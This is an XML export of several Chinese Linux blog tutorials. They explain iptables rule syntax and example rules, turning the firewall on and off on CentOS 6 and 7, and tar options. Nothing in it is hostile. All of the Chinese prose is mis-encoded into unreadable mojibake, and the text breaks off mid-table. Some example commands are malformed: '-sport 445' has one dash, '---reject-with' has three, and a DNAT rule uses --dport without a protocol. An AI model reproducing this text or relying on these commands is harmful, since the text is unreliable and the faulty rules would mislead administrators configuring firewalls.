ä¸­æ–­è¿‡æ»¤ç¨‹åºï¼Œå°†å°åŒ…æ”¾å…¥é˜Ÿåˆ—ï¼Œäº¤ç»™å…¶å®ƒç¨‹åºå¤„ç†ã€‚é€è¿‡è‡ªè¡Œå¼€å‘çš„å¤„ç†ç¨‹åºï¼Œå¯ä»¥è¿›è¡Œå…¶å®ƒåº”ç”¨ï¼Œä¾‹å¦‚ï¼šè®¡ç®—è”æœºè´¹ç”¨ç­‰ã€‚</li><li>RETURN ç»“æŸåœ¨ç›®å‰è§„åˆ™é“¾ä¸­çš„è¿‡æ»¤ç¨‹åºï¼Œè¿”å›ä¸»è§„åˆ™é“¾ç»§ç»­è¿‡æ»¤ï¼Œå¦‚æœæŠŠè‡ªè®¢è§„åˆ™ç‚¼çœ‹æˆæ˜¯ä¸€ä¸ªå­ç¨‹åºï¼Œé‚£ä¹ˆè¿™ä¸ªåŠ¨ä½œï¼Œå°±ç›¸å½“äºææ—©ç»“æŸå­ç¨‹åºå¹¶è¿”å›åˆ°ä¸»ç¨‹åºä¸­ã€‚</li><li>MARK å°†å°åŒ…æ ‡ä¸ŠæŸä¸ªä»£å·ï¼Œä»¥ä¾¿æä¾›ä½œä¸ºåç»­è¿‡æ»¤çš„æ¡ä»¶åˆ¤æ–­ä¾æ®ï¼Œè¿›è¡Œå®Œæ­¤å¤„ç†åŠ¨ä½œåï¼Œå°†ä¼šç»§ç»­æ¯”å¯¹å…¶å®ƒè§„åˆ™ã€‚èŒƒä¾‹å¦‚ä¸‹ï¼š</li></ul><pre class="line-numbers language-bash"><code class="language-bash">iptables -t mangle -A PREROUTING -p tcp --dport 22 -j MARK --set-mark 22<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å…¶å®ƒå‚æ•°è¯´æ˜"><a href="#å…¶å®ƒå‚æ•°è¯´æ˜" class="headerlink" title="å…¶å®ƒå‚æ•°è¯´æ˜"></a>å…¶å®ƒå‚æ•°è¯´æ˜</h3><pre class="line-numbers language-bash"><code class="language-bash">iptables <span class="token punctuation">[</span>-tè¡¨å<span class="token punctuation">]</span>  <span class="token operator">&lt;</span>é“¾å<span class="token operator">></span> <span class="token operator">&lt;</span>åŠ¨ä½œ<span class="token operator">></span>-t table ï¼šæŒ‡å®šè®¾ç½®çš„è¡¨ï¼šfilter nat mangle  ä¸æŒ‡å®šé»˜è®¤ä¸ºfilterCOMMANDï¼šå®šä¹‰å¦‚ä½•å¯¹è§„åˆ™è¿›è¡Œç®¡ç†chainï¼šæŒ‡å®šä½ æ¥ä¸‹æ¥çš„è§„åˆ™åˆ°åº•æ˜¯åœ¨å“ªä¸ªé“¾ä¸Šæ“ä½œçš„ï¼Œå½“å®šä¹‰ç­–ç•¥çš„æ—¶å€™ï¼Œå¯ä»¥çœç•¥CRETIRIA:æŒ‡å®šåŒ¹é…æ ‡å‡†-j ACTION :æŒ‡å®šå¦‚ä½•è¿›è¡Œå¤„ç†COMMANDè¯¦è§£ï¼š-P :è®¾ç½®é»˜è®¤ç­–ç•¥ï¼ˆè®¾å®šé»˜è®¤é—¨æ˜¯å…³ç€çš„è¿˜æ˜¯å¼€ç€çš„ï¼‰     iptables -P INPUT DROP è¿™å°±æŠŠé»˜è®¤è§„åˆ™ç»™æ‹’ç»äº†-F: FLASHï¼Œæ¸…ç©ºè§„åˆ™é“¾     iptables -t nat -F PREROUTING     iptables -t nat -F æ¸…ç©ºnatè¡¨çš„æ‰€æœ‰è§„åˆ™-Zï¼šæ¸…ç©ºé“¾   iptables -Z :æ¸…ç©º-Aï¼šè¿½åŠ ï¼Œåœ¨å½“å‰é“¾çš„æœ€åæ–°å¢ä¸€ä¸ªè§„åˆ™-I num <span class="token keyword">:</span> æ’å…¥ï¼ŒæŠŠå½“å‰è§„åˆ™æ’å…¥ä¸ºç¬¬å‡ æ¡     -I 3-R numï¼šReplaysæ›¿æ¢/ä¿®æ”¹ç¬¬å‡ æ¡è§„åˆ™     iptables -R 3 â€¦â€¦â€¦â€¦-D numï¼šåˆ é™¤ï¼Œæ˜ç¡®æŒ‡å®šåˆ é™¤ç¬¬å‡ æ¡è§„åˆ™     iptables -D INPUT 12-L æŸ¥çœ‹è§„åˆ™ï¼Œä¸‹é¢åŒ…å«å­å‘½ä»¤ï¼š     -nï¼šä»¥æ•°å­—çš„æ–¹å¼æ˜¾ç¤ºipï¼Œå®ƒä¼šå°†ipç›´æ¥æ˜¾ç¤ºå‡ºæ¥ï¼Œå¦‚æœä¸åŠ -nï¼Œåˆ™ä¼šå°†ipåå‘è§£ææˆä¸»æœºåã€‚     -vï¼šæ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯     --line-numbers <span class="token keyword">:</span> æ˜¾ç¤ºè§„åˆ™çš„è¡Œå·CRETIRIA è¯¦è§£ï¼š1.é€šç”¨åŒ¹é…ï¼šæºåœ°å€ç›®æ ‡åœ°å€çš„åŒ¹é…     -sï¼šæŒ‡å®šä½œä¸ºæºåœ°å€åŒ¹é…ï¼Œè¿™é‡Œä¸èƒ½æŒ‡å®šä¸»æœºåç§°ï¼Œå¿…é¡»æ˜¯IPï¼Œåœ°å€å¯ä»¥å–åï¼ŒåŠ ä¸€ä¸ªâ€œ<span class="token operator">!</span>â€è¡¨ç¤ºé™¤äº†å“ªä¸ªIPä¹‹å¤–     -dï¼šè¡¨ç¤ºåŒ¹é…ç›®æ ‡åœ°å€     -pï¼šç”¨äºåŒ¹é…åè®®çš„ï¼ˆè¿™é‡Œçš„åè®®é€šå¸¸æœ‰3ç§ï¼ŒTCP/UDP/ICMPï¼‰     -i eth0ï¼šä»è¿™å—ç½‘å¡æµå…¥çš„æ•°æ®   ï¼ˆæµå…¥ä¸€èˆ¬ç”¨åœ¨INPUTå’ŒPREROUTINGä¸Šï¼‰     -o eth0ï¼šä»è¿™å—ç½‘å¡æµå‡ºçš„æ•°æ®  ï¼ˆæµå‡ºä¸€èˆ¬åœ¨OUTPUTå’ŒPOSTROUTINGä¸Šï¼‰2.æ‰©å±•åŒ¹é…ï¼ˆéšå«æ‰©å±•ï¼šå¯¹åè®®çš„æ‰©å±• å’Œæ˜¾å¼æ‰©å±•ï¼ˆ-mï¼‰ï¼‰     -p tcp :TCPåè®®çš„æ‰©å±•       --dport XX-XXï¼šæŒ‡å®šç›®æ ‡ç«¯å£,ä¸èƒ½æŒ‡å®šå¤šä¸ªéè¿ç»­ç«¯å£,åªèƒ½æŒ‡å®šå•ä¸ªç«¯å£       --sportï¼šæŒ‡å®šæºç«¯å£       --tcp-fiagsï¼šTCPçš„æ ‡å¿—ä½åŒ¹é…ï¼ˆSYN,ACKï¼ŒFIN,PSHï¼ŒRST,URGï¼‰ï¼ˆä½¿ç”¨ç›¸å¯¹è¾ƒå°‘ï¼‰       --tcpflags syn,ack,fin,rst syn  ç”¨äºæ£€æµ‹ä¸‰æ¬¡æ¡æ‰‹çš„ç¬¬ä¸€æ¬¡åŒ…ï¼Œå¯ç®€å†™ä¸º--syn     -p udpï¼šUDPåè®®çš„æ‰©å±•  ï¼ˆä¸tcpç›¸ä¼¼ï¼‰     -p icmpï¼šicmpæ•°æ®æŠ¥æ–‡çš„æ‰©å±•     -m multiportï¼šè¡¨ç¤ºå¯ç”¨å¤šç«¯å£æ‰©å±•  --dports 21,23,80-j ACTION è¯¦è§£ï¼š     DROPï¼šè¡¨ç¤ºä¸¢å¼ƒ     REJECTï¼šæ˜ç¤ºæ‹’ç»     ACCEPTï¼šæ¥å—     custom_chainï¼šè½¬å‘ä¸€ä¸ªè‡ªå®šä¹‰çš„é“¾     MASQUERADEï¼šæºåœ°å€ä¼ªè£…     REDIRECTï¼šé‡å®šå‘ï¼šä¸»è¦ç”¨äºå®ç°ç«¯å£é‡å®šå‘     RETURNï¼šè¿”å›ï¼šåœ¨è‡ªå®šä¹‰é“¾æ‰§è¡Œå®Œæ¯•åä½¿ç”¨è¿”å›ï¼Œæ¥è¿”å›åŸè§„åˆ™é“¾<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å››ã€å®ä¾‹"><a href="#å››ã€å®ä¾‹" class="headerlink" title="å››ã€å®ä¾‹"></a>å››ã€å®ä¾‹</h2><h3 id="å¯åŠ¨-åœæ­¢-é‡å¯é˜²ç«å¢™"><a href="#å¯åŠ¨-åœæ­¢-é‡å¯é˜²ç«å¢™" class="headerlink" title="å¯åŠ¨/åœæ­¢/é‡å¯é˜²ç«å¢™"></a>å¯åŠ¨/åœæ­¢/é‡å¯é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> iptables stop<span class="token function">service</span> iptables start<span class="token function">service</span> iptables restartsystemctl stop iptablessystemctl start iptablessystemctl restart iptables<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="æŸ¥çœ‹è§„åˆ™"><a href="#æŸ¥çœ‹è§„åˆ™" class="headerlink" title="æŸ¥çœ‹è§„åˆ™"></a>æŸ¥çœ‹è§„åˆ™</h3><p>åˆ—å‡ºé»˜è®¤è¡¨ filter æ‰€æœ‰é“¾ä¸Šçš„è§„åˆ™</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -L<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åˆ—å‡º nat è¡¨ä¸­æ‰€æœ‰é“¾ä¸Šçš„è§„åˆ™</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -L<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åˆ—å‡º nat è¡¨ä¸­ PREROUTING é“¾ä¸Šçš„è§„åˆ™</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -L PREROUTING<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹é˜²ç«å¢™çš„çŠ¶æ€</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -L -n -v --line-numbers<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åˆ é™¤ä¸€æ¡è§„åˆ™"><a href="#åˆ é™¤ä¸€æ¡è§„åˆ™" class="headerlink" title="åˆ é™¤ä¸€æ¡è§„åˆ™"></a>åˆ é™¤ä¸€æ¡è§„åˆ™</h3><p>å°†æ‰€æœ‰ iptables ä»¥åºå·æ ‡è®°æ˜¾ç¤º</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -L INPUT -n --line-numbersiptables -L OUTPUT -n --line-numbersiptables -L OUTPUT -n --line-numbers <span class="token operator">|</span> <span class="token function">less</span>iptables -L OUTPUT -n --line-numbers <span class="token operator">|</span> <span class="token function">grep</span> 202.54.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>â€‹</p><p>åˆ é™¤ INPUT é‡Œåºå·ä¸º 8 çš„è§„åˆ™</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -D INPUT 8<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="å…è®¸ç‰¹å®šè§„åˆ™"><a href="#å…è®¸ç‰¹å®šè§„åˆ™" class="headerlink" title="å…è®¸ç‰¹å®šè§„åˆ™"></a>å…è®¸ç‰¹å®šè§„åˆ™</h3><p>å…è®¸ç‰¹å®šç«¯å£(TCP 22)</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -A INPUT -p tcp --dport 22 -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>å…è®¸æ¥è‡ª 192.168.0.4 çš„åŒ…</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -A INPUT -s 192.168.0.4 -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å…è®¸ç°æœ‰è¿æ¥æˆ–ä¸ç°æœ‰è¿æ¥å…³è”çš„åŒ…</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ‹¦æˆªç‰¹å®šæµé‡"><a href="#æ‹¦æˆªç‰¹å®šæµé‡" class="headerlink" title="æ‹¦æˆªç‰¹å®šæµé‡"></a>æ‹¦æˆªç‰¹å®šæµé‡</h3><p>æ‹¦æˆªæ¥è‡ªç‰¹å®š IP åœ°å€ 11.11.11.11 å¯¹æœ¬åœ°æœåŠ¡å…¨éƒ¨æµé‡</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -A INPUT -s 11.11.11.11 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>åˆ é™¤ä¸Šä¸€æ¡æ‹¦æˆªè§„åˆ™</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -D INPUT -s 11.11.11.11 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>å°é”ç‰¹å®šç«¯å£(TCP 445)</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -A INPUT -p tcp -sport 445 -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ç¦æ­¢ ICMP (ping)</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -A INPUT -p icmp --icmp-type echo-request -j REJECT ---reject-with icmp-host-prohibited<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>ç¦æ­¢ä» 80 ç«¯å£å‘èµ·æ–°çš„ TCP è¿æ¥ä½†å…è®¸ 80 ç«¯å£å“åº” TCP è¿æ¥</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t filter -A OUTPUT -p tcp --dport 80 -m state --state NEW -j DROP<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ç¦æ­¢æ‰€æœ‰å…¶ä»–åŒ…</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -P INPUT DROPiptables -P FORWARD DROP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="ä½œä¸ºç½‘å…³æä¾›-NAT-æœåŠ¡"><a href="#ä½œä¸ºç½‘å…³æä¾›-NAT-æœåŠ¡" class="headerlink" title="ä½œä¸ºç½‘å…³æä¾› NAT æœåŠ¡"></a>ä½œä¸ºç½‘å…³æä¾› NAT æœåŠ¡</h3><p>å°†æ¥è‡ª 192.168.2.0/24 å­ç½‘æ•°æ®åŒ…æºåœ°å€æ”¹å†™ä¸º 192.168.1.1</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -j SNAT --to-source 192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>å°†æ¥è‡ª 192.168.2.0/24 å­ç½‘æ•°æ®åŒ…æºåœ°å€æ”¹å†™ä¸ºé˜²ç«å¢™åœ°å€</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A POSTROUTING -s 192.168.2.0/24 -j MASQUERADE<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>å°†å¯¹ 192.168.1.1:80 çš„æ•°æ®åŒ…å‘é€åˆ° 192.168.1.11:80</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -d 192.168.1.1/24 --dport 80 -j DNAT --to-destination 192.168.1.11:80<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><p>å°†å¯¹æœ¬åœ° 80 ç«¯å£ çš„æ•°æ®åŒ…é‡å®šå‘åˆ° 8080 ç«¯å£</p><pre class="line-numbers language-bash"><code class="language-bash">iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-ports 8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äº”ã€å›ºåŒ–æ“ä½œ"><a href="#äº”ã€å›ºåŒ–æ“ä½œ" class="headerlink" title="äº”ã€å›ºåŒ–æ“ä½œ"></a>äº”ã€å›ºåŒ–æ“ä½œ</h2><h3 id="é…ç½®æ–‡ä»¶"><a href="#é…ç½®æ–‡ä»¶" class="headerlink" title="é…ç½®æ–‡ä»¶"></a>é…ç½®æ–‡ä»¶</h3><p>iptables çš„é…ç½®æ–‡ä»¶ï¼š /etc/sysconfig/iptables<br>â€‹</p><h3 id="ä¿å­˜é˜²ç«å¢™è§„åˆ™"><a href="#ä¿å­˜é˜²ç«å¢™è§„åˆ™" class="headerlink" title="ä¿å­˜é˜²ç«å¢™è§„åˆ™"></a>ä¿å­˜é˜²ç«å¢™è§„åˆ™</h3><p>iptables-save æ˜¯å°†è§„åˆ™è¿½åŠ åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œä¸»è¦æ˜¯é…åˆ iptables-restore å‘½ä»¤</p><pre class="line-numbers language-bash"><code class="language-bash">iptables-save <span class="token operator">></span> /etc/sysconfig/iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="åŠ è½½é˜²ç«å¢™è§„åˆ™"><a href="#åŠ è½½é˜²ç«å¢™è§„åˆ™" class="headerlink" title="åŠ è½½é˜²ç«å¢™è§„åˆ™"></a>åŠ è½½é˜²ç«å¢™è§„åˆ™</h3><pre class="line-numbers language-bash"><code class="language-bash">iptables-restore <span class="token operator">&lt;</span> /root/my.active.firewall.rules<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> é˜²ç«å¢™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CentOS 6/7 å…³é—­å¼€å¯é˜²ç«å¢™</title>
      <link href="/post/3eb4dfc4.html"/>
      <url>/post/3eb4dfc4.html</url>
      
        <content type="html"><![CDATA[<h1 id="CentOS-6-7-å…³é—­å¼€å¯é˜²ç«å¢™"><a href="#CentOS-6-7-å…³é—­å¼€å¯é˜²ç«å¢™" class="headerlink" title="CentOS 6/7 å…³é—­å¼€å¯é˜²ç«å¢™"></a>CentOS 6/7 å…³é—­å¼€å¯é˜²ç«å¢™</h1><h2 id="ä¸€ã€CentOS-6"><a href="#ä¸€ã€CentOS-6" class="headerlink" title="ä¸€ã€CentOS 6"></a>ä¸€ã€CentOS 6</h2><h3 id="æŸ¥çœ‹é˜²ç«å¢™"><a href="#æŸ¥çœ‹é˜²ç«å¢™" class="headerlink" title="æŸ¥çœ‹é˜²ç«å¢™"></a>æŸ¥çœ‹é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> iptables status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="å…³é—­é˜²ç«å¢™"><a href="#å…³é—­é˜²ç«å¢™" class="headerlink" title="å…³é—­é˜²ç«å¢™"></a>å…³é—­é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> iptables stop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="å¼€å¯é˜²ç«å¢™"><a href="#å¼€å¯é˜²ç«å¢™" class="headerlink" title="å¼€å¯é˜²ç«å¢™"></a>å¼€å¯é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">service</span> iptables start<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>â€‹</p><h3 id="æŸ¥è¯¢-iptables-æ˜¯å¦å¼€æœºè‡ªå¯åŠ¨"><a href="#æŸ¥è¯¢-iptables-æ˜¯å¦å¼€æœºè‡ªå¯åŠ¨" class="headerlink" title="æŸ¥è¯¢ iptables æ˜¯å¦å¼€æœºè‡ªå¯åŠ¨"></a>æŸ¥è¯¢ iptables æ˜¯å¦å¼€æœºè‡ªå¯åŠ¨</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> --list <span class="token operator">|</span> <span class="token function">grep</span> iptables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>0:off 1:off 2:on 3:on 4:on 5:on 6:off</p></blockquote><h3 id="æ°¸ä¹…å…³é—­é˜²ç«å¢™"><a href="#æ°¸ä¹…å…³é—­é˜²ç«å¢™" class="headerlink" title="æ°¸ä¹…å…³é—­é˜²ç«å¢™"></a>æ°¸ä¹…å…³é—­é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> iptables off<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ°¸ä¹…å¼€å¯é˜²ç«å¢™"><a href="#æ°¸ä¹…å¼€å¯é˜²ç«å¢™" class="headerlink" title="æ°¸ä¹…å¼€å¯é˜²ç«å¢™"></a>æ°¸ä¹…å¼€å¯é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash"><span class="token function">chkconfig</span> iptables on<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="äºŒã€CentOS-7"><a href="#äºŒã€CentOS-7" class="headerlink" title="äºŒã€CentOS 7"></a>äºŒã€CentOS 7</h2><h3 id="æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€"><a href="#æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€" class="headerlink" title="æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€"></a>æŸ¥çœ‹é˜²ç«å¢™çŠ¶æ€</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl status firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å…³é—­é˜²ç«å¢™-1"><a href="#å…³é—­é˜²ç«å¢™-1" class="headerlink" title="å…³é—­é˜²ç«å¢™"></a>å…³é—­é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl stop firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å¼€å¯é˜²ç«å¢™-1"><a href="#å¼€å¯é˜²ç«å¢™-1" class="headerlink" title="å¼€å¯é˜²ç«å¢™"></a>å¼€å¯é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl start firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ°¸ä¹…å…³é—­é˜²ç«å¢™-1"><a href="#æ°¸ä¹…å…³é—­é˜²ç«å¢™-1" class="headerlink" title="æ°¸ä¹…å…³é—­é˜²ç«å¢™"></a>æ°¸ä¹…å…³é—­é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl disable firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="æ°¸ä¹…å¼€å¯é˜²ç«å¢™-1"><a href="#æ°¸ä¹…å¼€å¯é˜²ç«å¢™-1" class="headerlink" title="æ°¸ä¹…å¼€å¯é˜²ç«å¢™"></a>æ°¸ä¹…å¼€å¯é˜²ç«å¢™</h3><pre class="line-numbers language-bash"><code class="language-bash">systemctl <span class="token function">enable</span> firewalld<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> é˜²ç«å¢™ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxæ–‡ä»¶ç³»ç»Ÿæƒé™</title>
      <link href="/post/148aa3db.html"/>
      <url>/post/148aa3db.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-æ–‡ä»¶ç³»ç»Ÿæƒé™-è„‘å›¾"><a href="#Linux-æ–‡ä»¶ç³»ç»Ÿæƒé™-è„‘å›¾" class="headerlink" title="Linux æ–‡ä»¶ç³»ç»Ÿæƒé™ - è„‘å›¾"></a>Linux æ–‡ä»¶ç³»ç»Ÿæƒé™ - è„‘å›¾</h1><p><img src="https://cdn.nlark.com/yuque/0/2021/jpeg/519483/1627561722226-cb9bb5b3-2729-4209-b781-79b50e1eb495.jpeg#clientId=ua705966b-1dda-4&amp;from=drop&amp;id=u0e6dbe82&amp;margin=%5Bobject%20Object%5D&amp;name=Linux%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F%E6%9D%83%E9%99%90-%E8%84%91%E5%9B%BE.jpeg&amp;originHeight=3344&amp;originWidth=4472&amp;originalType=binary%E2%88%B6=1&amp;size=1282465&amp;status=done&amp;style=none&amp;taskId=uebd3d789-d5b1-4e47-b08d-7a2756207ac" alt="Linuxæ–‡ä»¶ç³»ç»Ÿæƒé™-è„‘å›¾.jpeg"></p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linuxå‹ç¼©è§£å‹æ–‡ä»¶</title>
      <link href="/post/e2f51a6a.html"/>
      <url>/post/e2f51a6a.html</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-å‹ç¼©è§£å‹æ–‡ä»¶"><a href="#Linux-å‹ç¼©è§£å‹æ–‡ä»¶" class="headerlink" title="Linux å‹ç¼©è§£å‹æ–‡ä»¶"></a>Linux å‹ç¼©è§£å‹æ–‡ä»¶</h1><h2 id="ä¸€ã€tar"><a href="#ä¸€ã€tar" class="headerlink" title="ä¸€ã€tar"></a>ä¸€ã€tar</h2><h3 id="ä»‹ç»"><a href="#ä»‹ç»" class="headerlink" title="ä»‹ç»"></a>ä»‹ç»</h3><p>Linux tarï¼ˆè‹±æ–‡å…¨æ‹¼ï¼štape archive ï¼‰å‘½ä»¤ç”¨äºå¤‡ä»½æ–‡ä»¶ã€‚<br>tar æ˜¯ç”¨æ¥å»ºç«‹ï¼Œè¿˜åŸå¤‡ä»½æ–‡ä»¶çš„å·¥å…·ç¨‹åºï¼Œå®ƒå¯ä»¥åŠ å…¥ï¼Œè§£å¼€å¤‡ä»½æ–‡ä»¶å†…çš„æ–‡ä»¶ã€‚<br>â€‹</p><h3 id="å¸¸ç”¨å‚æ•°"><a href="#å¸¸ç”¨å‚æ•°" class="headerlink" title="å¸¸ç”¨å‚æ•°"></a>å¸¸ç”¨å‚æ•°</h3><table><thead><tr><th><strong>å‚æ•°</strong></th><th><strong>è§£é‡Š</strong></th></tr></thead><tbody><tr><td>-A</td><td>æ–°å¢æ–‡ä»¶åˆ°ä»¥å­˜åœ¨çš„å¤‡ä»½æ–‡ä»¶</td></tr><tr><td>-B</td><td>è®¾ç½®åŒºå—å¤§å°</td></tr><tr><td>-c</td><td>å»ºç«‹æ–°çš„å¤‡ä»½æ–‡ä»¶</td></tr><tr><td>-C &lt;ç›®å½•&gt;</td><td>åˆ‡æ¢å·¥ä½œç›®å½•ï¼Œå…ˆè¿›å…¥æŒ‡å®šç›®å½•å†æ‰§è¡Œå‹ç¼©/è§£å‹ç¼©æ“ä½œï¼Œå¯ç”¨äºä»…å‹ç¼©ç‰¹å®šç›®å½•é‡Œçš„å†…å®¹æˆ–è§£å‹ç¼©åˆ°ç‰¹å®šç›®å½•</td></tr><tr><td>-d</td><td>è®°å½•æ–‡ä»¶çš„å·®åˆ«</td></tr><tr><td>-x</td><td>ä»å½’æ¡£æ–‡ä»¶ä¸­æå–æ–‡ä»¶</td></tr><tr><td>-t</td><td>åˆ—å‡ºå¤‡ä»½æ–‡ä»¶çš„å†…å®¹</td></tr><tr><td>-z</td><td>é€šè¿‡ gzip æŒ‡ä»¤å‹ç¼©/è§£å‹ç¼©æ–‡ä»¶ï¼Œæ–‡ä»¶åæœ€å¥½ä¸º*.tar.gz</td></tr><tr><td>-Z</td><td>é€šè¿‡ compress æŒ‡ä»¤å¤„ç†å¤‡ä»½æ–‡ä»¶</td></tr><tr><td>-f&lt;å¤‡ä»½æ–‡ä»¶&gt;</td><td>æŒ‡å®šå¤‡ä»½æ–‡ä»¶</td></tr><tr><td>-v</td><td>æ˜¾ç¤ºæŒ‡ä»¤æ‰§è¡Œè¿‡ç¨‹</td></tr><tr><td>-r</td><td>æ·»åŠ æ–‡ä»¶åˆ°å·²ç»å‹ç¼©çš„æ–‡ä»¶</td></tr><tr><td>-u</td><td>æ·»åŠ æ”¹å˜äº†å’Œç°æœ‰çš„æ–‡ä»¶åˆ°å·²ç»å­˜åœ¨çš„å‹ç¼©æ–‡ä»¶</td></tr><tr><td>-j</td><td>é€šè¿‡ bzip2 